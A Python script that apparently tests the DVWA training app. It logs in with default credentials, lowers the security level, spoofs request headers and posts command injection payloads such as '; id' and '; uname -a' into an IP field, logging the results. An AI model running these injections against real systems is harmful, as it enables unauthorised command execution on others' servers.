from bs4 import BeautifulSoup
import requests
import sys
import time
import json
from datetime import datetime
from pathlib import Path
import os

# Setup directories and session
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL and/or request rate were not provided.")
    sys.exit(1)

delays = {'low': 10, 'medium': 5, 'high': 3}
delay = delays.get(request_rate, 'medium')

exec_url = f"{base_url}/vulnerabilities/exec/"

# Headers to spoof User-Agent and IP address
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'X-Forwarded-For': '192.168.1.1'
}
# Construct the target URL for brute force attacks
target_url = f"{base_url}/vulnerabilities/brute/"
login_url = f"{base_url}/login.php"
security_url = f"{base_url}/security.php"

def login_and_setup_security():
    #response = session.get(login_url)
    data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
    }
    response = session.post(login_url, data=data, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
    time.sleep(delay) 
    
    #response = session.get(security_url)
    data = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': user_token
    }
    session.post(security_url, data=data, headers=headers)
    time.sleep(delay) 

def command_injection_attack():
    commands = ["; id", "; uname -a","; pwd", "&& ls"]
    results = []
    total_tests = 0
    tests_passed = 0
    tests_failed = 0

    for command in commands:
        data = {'ip': '127.0.0.1' + command, 'Submit': 'Submit'}
        response = session.post(exec_url, data=data, headers=headers)
        total_tests += 1

        if 200 <= response.status_code < 300:
            tests_passed += 1
            result_status = f"PASSED - Response Code is {response.status_code}"
        
        else:
            tests_failed += 1
            result_status = f"FAILED - Response Code not 200, got {response.status_code}"

        results.append({
            'command': command,
            'response_code': response.status_code,
            'status': result_status
        })
        print(f"Executed: {command}\nResult Status: {result_status}\nResponse Code: {response.status_code}")
        time.sleep(delay)

    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': exec_url,
        'details': results
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    login_and_setup_security()
    command_injection_attack()
